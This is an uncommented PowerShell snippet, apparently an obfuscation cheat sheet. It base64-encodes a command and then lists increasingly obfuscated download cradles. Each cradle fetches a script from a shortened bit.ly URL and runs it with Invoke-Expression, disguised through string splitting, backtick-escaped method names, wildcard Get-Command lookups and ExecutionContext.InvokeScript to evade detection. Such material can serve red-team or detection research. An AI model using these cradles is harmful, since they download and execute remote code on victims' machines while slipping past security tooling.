$string = {Get-Process}.ToString()
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))

powershell.exe -encodedCommand $encodedCommand

$decodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedCommand))
$decodedText

Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://bit.ly/L3g1t")

Invoke-Expression (New-Object Net.WebClient).DownloadString("https://bit.ly/L3g1t")

Invoke-Expression (New-Object Net.WebClient).DownloadString('ht'+'tps://bit.ly/L3g1t')

Invoke-Expression (New-Object Net.WebClient)."DownloadString"('ht'+'tps://bit.ly/L3g1t')

Invoke-Expression (New-Object Net.WebClient)."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('ht'+'tps://bit.ly/L3g1t')

Invoke-Expression (.(GCM *w-O*) ("Net"+".Web"+"Client"))."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('ht'+'tps://bit.ly/L3g1t')

`I`E`X (.(GCM *w-O*) ("Net"+".Web"+"Client"))."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('ht'+'tps://bit.ly/L3g1t')

$ExecutionContext.InvokeCommand.InvokeScript({(.(GCM *w-O*) ("Net"+".Web"+"Client"))."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('ht'+'tps://bit.ly/L3g1t')})

